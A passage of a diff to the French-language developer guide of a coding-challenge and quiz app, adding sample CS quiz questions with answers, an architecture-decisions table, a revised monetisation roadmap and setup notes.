+2. **Easy** — Nœud arbre binaire : max enfants → **2**
+3. **Medium** — Insertion BST équilibré → **O(log n)**
+4. **Medium** — Priority queue efficace → **Heap**
+5. **Hard** — Complexité spatiale hash table → **O(n)**
+6. **Hard** — Niveaux attendus skip list → **O(log n)**
+
+#### General CS (6)
+1. **Easy** — RAM = → **Random Access Memory**
+2. **Easy** — HTTP = → **HyperText Transfer Protocol**
+3. **Medium** — Processus vs Thread → **threads partagent mémoire d'un processus**
+4. **Medium** — SOLID → **Single responsibility, Open/closed, Liskov, Interface segregation, Dependency inversion**
+5. **Hard** — Théorème CAP → **Consistency, Availability, Partition tolerance (2 sur 3 garantissables)**
+6. **Hard** — TCP vs UDP → **TCP orienté connexion fiable ; UDP sans connexion plus rapide**
+
+---
+
+### Décisions d'architecture clés
+
+| Décision | Raison |
+|---|---|
+| Soumission VS via **SignalR** (pas HTTP) | Temps critique — détermine `IsFirst` pour les 2 pts |
+| **Timer côté client** avec déduplication serveur | Évite `Task.Delay` en boucle sur le hub · `QuizMatchState` ignore les doublons |
+| `QuestionIds` stocké en **JSON dans la colonne** | Évite table de jonction pour 10 IDs fixes · SQLite TEXT suffit |
+| `QuizSessionDto` inclut la **liste de questions** | Frontend affiche les 10 questions sans 10 requêtes API |
+| Matchmaking sur **exact Category+Difficulty** | Équité du match — questions identiques en difficulté |
+
+---
+
+## 11. Plan de monétisation
 
 ### Vue d'ensemble
 
@@ -775,21 +1134,27 @@ Items vendables (1,99–9,99$ pièce) :
 ### Roadmap de lancement (6 mois)
 
 ```
-Mois 1 : Page Profil + Streak journalier + Solution officielle
-         → Fondation de l'expérience premium
+Mois 1 : ✅ FAIT — Page Profil + Streak + Solution officielle + Hints
+         + Discussion chat iMessage + 51 challenges (Easy/Medium/Hard)
+         + Quiz solo + VS, Badges, Profil public, Admin panel
+         → Fondation de l'expérience
 
-Mois 2 : Hébergement (Railway/Render) + PostgreSQL + SMTP (Resend/Mailgun)
-         → App accessible publiquement
+Mois 2 : ✅ FAIT — Stripe + Système Premium complet (Checkout, webhooks)
+         + Gating Courses/Quiz/VS/Hard challenges + Page Pricing
+         → Premier dollar encaissé possible
 
-Mois 3 : Stripe intégration + Système Premium (IsPremium, paywalls)
-         → Premier dollar encaissé
+Mois 3 : Hébergement (Railway) + Vercel + domaine custom + HTTPS
+         + Secrets en variables d'env + Vérification domaine Resend
+         → App accessible publiquement, Stripe live
 
-Mois 4 : Boutique cosmétique (badges, thèmes)
-         → Revenu impulsif
+Mois 4 : Notifications email (streak en danger, résultat VS)
+         + Badge Premium sur profil + Annulation abonnement dans profil
+         + Sandboxing exécution code (Docker)
+         → Engagement + sécurité prod
 
 Mois 5 : VS Mode "gems" (monnaie virtuelle achetable)
-         + Challenges "Pro" exclusifs Premium
-         → Engagement + rétention
+         + Challenges "Pro" exclusifs Premium (contenu additionnel)
+         → Rétention
 
 Mois 6 : Certifications + Partenariats recruteurs
          → B2B, revenu plus élevé par client
@@ -832,7 +1197,8 @@ cd src/CloudCode.API
 dotnet run
 # Démarre sur http://localhost:5072
 # Les migrations sont appliquées automatiquement au démarrage
-# Le seeder injecte les 51 challenges au premier démarrage
+# Le seeder injecte les 25 challenges de base au démarrage (upsert par slug)
+# Les 30 challenges supplémentaires ont été ajoutés directement en DB via script Python
 ```
 
 ### Frontend
@@ -962,4 +1328,4 @@ const data = require('fs').readFileSync(0, 'utf8').trim().split('\n');
 
 ---
 
-*Ce guide couvre l'état de l'application au 11 mars 2026. Mettre à jour après chaque feature importante.*
+*Ce guide couvre l'état de l'application au 14 mars 2026. Mettre à jour après chaque feature importante.*
